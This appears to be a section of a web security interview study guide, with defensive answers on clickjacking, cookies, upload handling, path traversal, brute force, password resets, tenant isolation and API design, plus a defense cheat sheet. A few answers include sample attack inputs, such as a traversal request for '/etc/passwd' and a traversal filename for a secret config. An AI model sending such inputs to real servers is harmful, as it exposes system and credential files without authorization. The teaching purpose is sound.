**Q14: What is clickjacking? How does X-Frame-Options prevent it?**

> **A**: Clickjacking overlays a transparent iframe of the target site over a decoy page. User thinks they're clicking decoy elements but actually clicking real buttons on the invisible target (like "Delete Account" or "Transfer Funds"). `X-Frame-Options: DENY` tells the browser to refuse rendering the page inside any frame. Modern replacement: `Content-Security-Policy: frame-ancestors 'none'` (more flexible, supports allowlisting specific framers).

**Q15: Explain SameSite cookie attribute. What are the three values?**

> **A**: SameSite controls when cookies are sent on cross-site requests: (1) `Strict` — never sent on cross-site requests (maximum CSRF protection, but breaks legitimate cross-site navigation), (2) `Lax` (default since Chrome 80) — sent on top-level navigations (GET) but not on cross-site POST/iframe/fetch (good balance), (3) `None` — always sent (requires Secure flag, needed for legitimate cross-site scenarios like OAuth). For session cookies: use `Lax` or `Strict`.

**Q16: How would you secure a file upload endpoint?**

> **A**: (1) Validate file type by content (magic bytes), not just extension, (2) Set maximum file size, (3) Rename file to random UUID (prevent path traversal), (4) Store outside web root or in blob storage (prevent direct execution), (5) Scan for malware, (6) Set Content-Disposition: attachment for downloads (prevent XSS via uploaded HTML), (7) Validate image dimensions if applicable, (8) Use separate domain for serving user content (prevent cookie theft via XSS in uploaded files).

**Q17: What is path traversal? Give an example.**

> **A**: Path traversal exploits insufficient input validation on file paths to access files outside the intended directory. Example: `GET /download?file=../../../../etc/passwd` — if the server naively appends user input to a base path, it reads system files. Prevention: (1) Never use user input directly in file paths, (2) Resolve canonical path and verify it starts with the expected base directory, (3) Use a file ID mapping instead of filenames, (4) Run app with minimal filesystem permissions.

**Q18: What is HTTP Parameter Pollution?**

> **A**: HPP exploits how servers handle duplicate parameters. URL: `/transfer?amount=100&amount=99999` — some frameworks take the first value, some take the last, some concatenate. Attacker can bypass validation (first value checked) while the actual processing uses the second value. Prevention: use strict parameter parsing, reject duplicate parameters, validate at the same point where processing happens.

**Q19: Explain the difference between 401 and 403 HTTP status codes from a security perspective.**

> **A**: 401 (Unauthorized) means authentication failed — the server doesn't know WHO you are (missing/invalid/expired token). Client should re-authenticate. 403 (Forbidden) means authentication succeeded but authorization failed — server knows who you are but you don't have permission. Client should NOT retry with same credentials. Security implication: returning 403 on non-existent resources confirms the resource exists (information leakage) — consider returning 404 for resources the user shouldn't know about.

**Q20: How do you prevent brute-force attacks on a login endpoint?**

> **A**: Multi-layer approach: (1) Rate limiting per IP (e.g., 10 attempts/minute), (2) Rate limiting per account (e.g., 5 attempts before lockout), (3) Progressive delays (exponential backoff after failures), (4) CAPTCHA after 3 failed attempts, (5) Account lockout with unlock via email (be careful: DoS vector — lock anyone's account), (6) Credential stuffing protection: detect known leaked passwords, anomaly detection on login patterns. Important: don't reveal whether username exists in error messages.

### Advanced Scenarios (Q21-Q25)

**Q21: How would you design a secure password reset flow?**

> **A**: (1) User requests reset → generate cryptographically random token (not sequential), (2) Store token hash (not plaintext) in DB with expiry (15-30 min), (3) Send one-time link via email: `reset?token=abc`, (4) On submission: verify token hash, check expiry, check not-already-used, (5) Require new password, invalidate all existing sessions, (6) Send notification email confirming reset. Critical: never reveal if email exists (enumerate users), rate limit requests, invalidate token after use.

**Q22: You're building a multi-tenant SaaS app. How do you prevent data leakage between tenants?**

> **A**: (1) Tenant context on every query (row-level security or separate schemas), (2) Never trust client-provided tenant ID — derive from authentication token, (3) Test: can User-A in Tenant-1 see Tenant-2's data by manipulating IDs? (4) Separate encryption keys per tenant, (5) Audit logs per tenant, (6) Consider: separate databases per tenant for strongest isolation (but harder to manage). Critical mistake: tenant ID in URL path without server-side verification.

**Q23: How do you handle security in a single-page application (SPA)?**

> **A**: SPAs face unique challenges: (1) Token storage: HttpOnly cookies (immune to XSS theft) > memory variables > localStorage (accessible to XSS), (2) CSRF: if using cookies for auth, need CSRF tokens; if using Authorization header, CSRF-immune but XSS-vulnerable, (3) CSP is critical: prevent XSS from stealing tokens, (4) Token refresh: use refresh token rotation (detect theft), (5) Route-level auth checks on BOTH client (UX) AND server (security), (6) Never trust client-side auth checks alone.

**Q24: Explain the "confused deputy" problem with an example.**

> **A**: A confused deputy is a privileged program tricked into misusing its authority on behalf of an attacker. Example: Server has S3 access to store user uploads. Attacker provides filename `../../secret/config.json` → server's privileged S3 access is used to read/overwrite sensitive files. Another example: SSRF — server is the "deputy" with internal network access, confused into fetching internal resources for the attacker. Fix: always validate that the action is authorized for the ORIGINAL requester, not just that the server has permission.

**Q25: Design a security architecture for a REST API serving mobile and web clients.**

> **A**: Architecture: (1) API Gateway: rate limiting, WAF, DDoS protection, (2) Authentication: OAuth2 with PKCE for SPAs/mobile, client credentials for server-to-server, (3) Short-lived access tokens (5-15 min) + refresh token rotation, (4) Input validation: JSON Schema validation at gateway, business validation in service, (5) Authorization: RBAC/ABAC checked at API level, (6) TLS everywhere (including internal), (7) Response filtering (don't expose internal IDs, metadata), (8) Security headers, CORS for web, certificate pinning for mobile, (9) Audit logging for all state-changing operations, (10) API versioning with deprecation policy.

---

## 📊 Web Security Defense Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════╗
║              WEB SECURITY QUICK REFERENCE                         ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  SQL Injection  → Parameterized queries (PreparedStatement)      ║
║  XSS            → Output encoding + CSP + HttpOnly cookies       ║
║  CSRF           → CSRF tokens + SameSite=Lax cookies             ║
║  SSRF           → URL allowlist + block internal IPs             ║
║  Clickjacking   → X-Frame-Options: DENY / frame-ancestors       ║
║  Path Traversal → Canonical path validation + allowlist          ║
║  CORS           → Explicit origin allowlist (never reflect *)    ║
║  Brute Force    → Rate limiting + account lockout + CAPTCHA      ║
║  Session Hijack → HttpOnly + Secure + short expiry + MFA         ║
║                                                                  ║
║  GOLDEN RULE: Never trust user input. Validate everything.       ║
║  Encode on output. Authenticate every request. Authorize every   ║
║  action. Log everything. Fail secure.                            ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🔗 What's Next?

| Topic | Link | Why Read It? |
|-------|------|-------------|
| Secure Coding Practices | [04_Secure_Coding_Practices_QA.md](./04_Secure_Coding_Practices_QA.md) | Turn this knowledge into code patterns |
| OWASP Top 10 | [../OWASP_Top10.md](../OWASP_Top10.md) | Complete OWASP vulnerability reference |
| API Security | [../API_Security_Best_Practices.md](../API_Security_Best_Practices.md) | Secure your API endpoints |

---

*[← Cryptography Essentials](./02_Cryptography_Essentials_QA.md) | [Back to Security Index](../README.md) | [Next: Secure Coding Practices →](./04_Secure_Coding_Practices_QA.md)*
